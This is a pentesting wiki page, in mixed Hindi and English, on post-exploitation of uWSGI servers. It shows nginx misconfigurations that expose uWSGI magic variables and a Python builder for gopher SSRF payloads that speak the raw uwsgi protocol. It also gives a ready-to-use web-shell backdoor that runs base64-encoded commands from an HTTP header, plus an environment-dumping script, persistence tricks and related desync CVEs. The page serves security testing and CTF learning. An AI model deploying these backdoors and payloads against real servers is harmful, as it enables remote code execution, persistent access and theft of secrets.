# WSGI Post-Exploitation Tricks

{{#include ../../banners/hacktricks-training.md}}

## WSGI अवलोकन

Web Server Gateway Interface (WSGI) एक specification है जो बताती है कि एक वेब सर्वर web applications के साथ कैसे संवाद करता है, और कैसे web applications को एक अनुरोध को प्रोसेस करने के लिए chained किया जा सकता है। uWSGI सबसे लोकप्रिय WSGI servers में से एक है, अक्सर Python web applications सर्व करने के लिए इस्तेमाल होता है। इसका native binary transport uwsgi protocol (lowercase) है जो backend application server को key/value पैरामीटर का एक बैग ("uwsgi params") भेजता है।

Related pages you may also want to check:

{{#ref}}
werkzeug.md
{{#endref}}

{{#ref}}
../../pentesting-web/ssrf-server-side-request-forgery/README.md
{{#endref}}

## uWSGI Magic Variables Exploitation

uWSGI provides special "magic variables" that can change how the instance loads and dispatches applications. These variables are not normal HTTP headers — they are uwsgi parameters carried inside the uwsgi/SCGI/FastCGI request from the reverse proxy (nginx, Apache mod_proxy_uwsgi, etc.) to the uWSGI backend. If a proxy configuration maps user-controlled data into uwsgi parameters (for example via `$arg_*`, `$http_*`, or unsafely exposed endpoints that talk the uwsgi protocol), attackers can set these variables and achieve code execution.

### Dangerous mappings in front proxies (nginx example)

नीचे जैसे गलत कॉन्फ़िगरेशन सीधे uWSGI magic variables को user input के लिए एक्सपोज़ कर देते हैं:
```
location /app/ {
include uwsgi_params;
# DANGEROUS: maps query args into uwsgi params
uwsgi_param UWSGI_FILE $arg_f;                 # /app/?f=/tmp/backdoor.py
uwsgi_param UWSGI_MODULE $http_x_mod;          # header: X-Mod: pkg.mod
uwsgi_param UWSGI_CALLABLE $arg_c;             # /app/?c=application
uwsgi_pass unix:/run/uwsgi/app.sock;
}
```
यदि app या upload फीचर अनुमानित path के अंतर्गत फाइलें लिखने की अनुमति देता है, तो इसे ऊपर दिए गए mappings के साथ मिलाने पर आम तौर पर backend द्वारा attacker-controlled file/module को लोड करने पर तुरंत RCE हो जाता है।

### मुख्य Exploitable Variables

#### `UWSGI_FILE` - मनमानी फ़ाइल लोड/एक्सीक्यूट
```
uwsgi_param UWSGI_FILE /path/to/python/file.py;
```
किसी भी मनमाने Python फ़ाइल को WSGI application के रूप में लोड और निष्पादित करता है। यदि कोई हमलावर इस पैरामीटर को uwsgi param bag के माध्यम से नियंत्रित कर सके, तो वे Remote Code Execution (RCE) प्राप्त कर सकते हैं।

#### `UWSGI_SCRIPT` - स्क्रिप्ट लोडिंग
```
uwsgi_param UWSGI_SCRIPT module.path:callable;
uwsgi_param SCRIPT_NAME /endpoint;
```
निर्दिष्ट स्क्रिप्ट को एक नए एप्लिकेशन के रूप में लोड करता है। file upload या write capabilities के साथ संयुक्त होने पर, यह RCE का कारण बन सकता है।

#### `UWSGI_MODULE` और `UWSGI_CALLABLE` - डायनामिक मॉड्यूल लोडिंग
```
uwsgi_param UWSGI_MODULE malicious.module;
uwsgi_param UWSGI_CALLABLE evil_function;
uwsgi_param SCRIPT_NAME /backdoor;
```
ये पैरामीटर arbitrary Python मॉड्यूल्स को लोड करने और उनके भीतर विशिष्ट फ़ंक्शन कॉल करने की अनुमति देते हैं।

#### `UWSGI_SETENV` - एनवायरनमेंट वैरिएबल का हेरफेर
```
uwsgi_param UWSGI_SETENV DJANGO_SETTINGS_MODULE=malicious.settings;
```
environment variables को संशोधित करने के लिए उपयोग किया जा सकता है, जिससे application behavior प्रभावित हो सकता है या malicious configuration लोड हो सकती है।

#### `UWSGI_PYHOME` - Python Environment Manipulation
```
uwsgi_param UWSGI_PYHOME /path/to/malicious/venv;
```
Python virtual environment को बदलता है, जिससे संभावित रूप से दुर्भावनापूर्ण packages या अलग Python interpreters लोड हो सकते हैं।

#### `UWSGI_CHDIR` - डायरेक्टरी बदलना
```
uwsgi_param UWSGI_CHDIR /etc/;
```
अनुरोधों को संसाधित करने से पहले यह कार्यशील निर्देशिका बदल देता है और अन्य सुविधाओं के साथ संयोजित किया जा सकता है।

## SSRF + uwsgi protocol (gopher) pivot

### Threat model

यदि लक्ष्य वेब ऐप एक SSRF primitive उजागर करता है और uWSGI instance एक internal TCP socket पर सुन रहा है (उदाहरण के लिए, `socket = 127.0.0.1:3031`), तो आप gopher के माध्यम से raw uwsgi protocol से बात कर सकते हैं और uWSGI magic variables इंजेक्ट कर सकते हैं।

यह संभव इसलिए है क्योंकि कई तैनातियाँ आंतरिक रूप से non-HTTP uwsgi socket का उपयोग करती हैं; reverse proxy (nginx/Apache) क्लाइंट HTTP को uwsgi param bag में अनुवादित करता है। SSRF+gopher के साथ आप सीधे uwsgi binary packet तैयार कर सकते हैं और `UWSGI_FILE` जैसे खतरनाक वेरिएबल सेट कर सकते हैं।

### uWSGI protocol structure (quick reference)

- Header (4 bytes): `modifier1` (1 byte), `datasize` (2 bytes little-endian), `modifier2` (1 byte)
- Body: sequence of `[key_len(2 LE)] [key_bytes] [val_len(2 LE)] [val_bytes]`

मानक अनुरोधों के लिए `modifier1` 0 होता है। बॉडी में uwsgi params होते हैं जैसे `SERVER_PROTOCOL`, `REQUEST_METHOD`, `PATH_INFO`, `UWSGI_FILE`, आदि। पूर्ण विवरण के लिए आधिकारिक प्रोटोकॉल स्पेसिफिकेशन देखें।

### Minimal packet builder (generate gopher payload)
```python
import struct, urllib.parse

def uwsgi_gopher_url(host, port, params):
body = b''.join([struct.pack('<H', len(k))+k.encode()+struct.pack('<H', len(v))+v.encode() for k,v in params.items()])
pkt  = bytes([0]) + struct.pack('<H', len(body)) + bytes([0]) + body
return f"gopher://{host}:{port}/_" + urllib.parse.quote_from_bytes(pkt)

# Example URL:
gopher://127.0.0.1:5000/_%00%D2%00%00%0F%00SERVER_PROTOCOL%08%00HTTP/1.1%0E%00REQUEST_METHOD%03%00GET%09%00PATH_INFO%01%00/%0B%00REQUEST_URI%01%00/%0C%00QUERY_STRING%00%00%0B%00SERVER_NAME%00%00%09%00HTTP_HOST%0E%00127.0.0.1%3A5000%0A%00UWSGI_FILE%1D%00/app/profiles/malicious.json%0B%00SCRIPT_NAME%10%00/malicious.json
```
सर्वर पर पहले लिखी गई फ़ाइल को जबरन लोड करने का उदाहरण:
```python
params = {
'SERVER_PROTOCOL':'HTTP/1.1', 'REQUEST_METHOD':'GET', 'PATH_INFO':'/',
'UWSGI_FILE':'/app/profiles/malicious.py', 'SCRIPT_NAME':'/malicious.py'
}
print(uwsgi_gopher_url('127.0.0.1', 3031, params))
```
जनरेट किए गए URL को SSRF sink के माध्यम से भेजें।

### उदाहरण

यदि आप डिस्क पर एक python फ़ाइल लिख सकते हैं (एक्सटेंशन मायने नहीं रखता) और उसमें निम्नलिखित कोड जैसा कुछ लिख सकते हैं:
```python
# /app/profiles/malicious.py
import os
os.system('/readflag > /app/profiles/result.txt')

def application(environ, start_response):
start_response('200 OK', [('Content-Type','text/plain')])
return [b'ok']
```
इस पथ पर `UWSGI_FILE` सेट करने वाला एक gopher payload बनाएं और trigger करें। backend इसे import करके WSGI app के रूप में execute करेगा।

## Post-Exploitation Techniques

### 1. Persistent Backdoors

#### File-based Backdoor
```python
# backdoor.py
import subprocess, base64

def application(environ, start_response):
cmd = environ.get('HTTP_X_CMD', '')
if cmd:
result = subprocess.run(base64.b64decode(cmd), shell=True, capture_output=True, text=True)
response = f"STDOUT: {result.stdout}\nSTDERR: {result.stderr}"
else:
response = 'Backdoor active'
start_response('200 OK', [('Content-Type', 'text/plain')])
return [response.encode()]
```
इसे `UWSGI_FILE` के साथ लोड करें और किसी चुने हुए `SCRIPT_NAME` के तहत पहुँचें।

#### पर्यावरण-आधारित Persistence
```
uwsgi_param UWSGI_SETENV PYTHONPATH=/tmp/malicious:/usr/lib/python3.11/site-packages;
```
### 2. Information Disclosure

#### Environment Variable Dumping
```python
# env_dump.py
import os, json

def application(environ, start_response):
env_data = {'os_environ': dict(os.environ), 'wsgi_environ': dict(environ)}
start_response('200 OK', [('Content-Type', 'application/json')])
return [json.dumps(env_data, indent=2).encode()]
```
#### फ़ाइल सिस्टम एक्सेस
`UWSGI_CHDIR` को किसी file-serving helper के साथ जोड़कर संवेदनशील निर्देशिकाओं को ब्राउज़ करें।

### 3. Privilege Escalation विचार

- यदि uWSGI elevated privileges के साथ चलता है और root के स्वामित्व वाले sockets/pids लिखता है, तो env और निर्देशिका परिवर्तनों के दुरुपयोग से आप root मालिक वाली फ़ाइलें बना सकते हैं या runtime state को नियंत्रित कर सकते हैं।
- `UWSGI_FILE` के माध्यम से लोड की गई फ़ाइल के भीतर environment (`UWSGI_*`) से configuration को override करने से process model और workers प्रभावित हो सकते हैं, जिससे persistence stealthier बन सकता है।
```python
# malicious_config.py
import os

# Override uWSGI configuration
os.environ['UWSGI_MASTER'] = '1'
os.environ['UWSGI_PROCESSES'] = '1'
os.environ['UWSGI_CHEAPER'] = '1'
```
## uWSGI चेन से संबंधित Reverse-proxy desync मुद्दे (हालिया)

Apache httpd के साथ `mod_proxy_uwsgi` का उपयोग करने वाले deployments ने हाल ही में response-splitting/desynchronization बग्स का सामना किया है जो frontend↔backend translation layer को प्रभावित कर सकते हैं:

- CVE-2023-27522 (Apache httpd 2.4.30–2.4.55; also relevant to uWSGI integration prior to 2.0.22/2.0.26 fixes): crafted origin response headers `mod_proxy_uwsgi` के उपयोग के दौरान HTTP response smuggling का कारण बन सकते हैं. Apache को ≥2.4.56 में अपग्रेड करने से यह समस्या कम हो जाती है.
- CVE-2024-24795 (fixed in Apache httpd 2.4.59; uWSGI 2.0.26 adjusted its Apache integration): multiple httpd modules में HTTP response splitting के कारण desync हो सकता है जब backends headers inject करते हैं. uWSGI के 2.0.26 changelog में यह “let httpd handle CL/TE for non-http handlers.” के रूप में दिखता है।

ये सीधे uWSGI में RCE प्रदान नहीं करते, लेकिन edge cases में इन्हें header injection या SSRF के साथ chain करके uwsgi backend की ओर pivot किया जा सकता है. टेस्ट के दौरान proxy और version को fingerprint करें और desync/smuggling primitives को backend-only routes और sockets तक पहुंच का एक संभावित रास्ता मानें।

## References

- [uWSGI Magic Variables Documentation](https://uwsgi-docs.readthedocs.io/en/latest/Vars.html)
- [IOI SaveData CTF Writeup](https://bugculture.io/writeups/web/ioi-savedata)
- [uWSGI Security Best Practices](https://uwsgi-docs.readthedocs.io/en/latest/Security.html)
- [The uwsgi Protocol (spec)](https://uwsgi-docs.readthedocs.io/en/latest/Protocol.html)
- [uWSGI 2.0.26 changelog mentioning CVE-2024-24795 adjustments](https://uwsgi-docs.readthedocs.io/en/latest/Changelog-2.0.26.html)

{{#include ../../banners/hacktricks-training.md}}
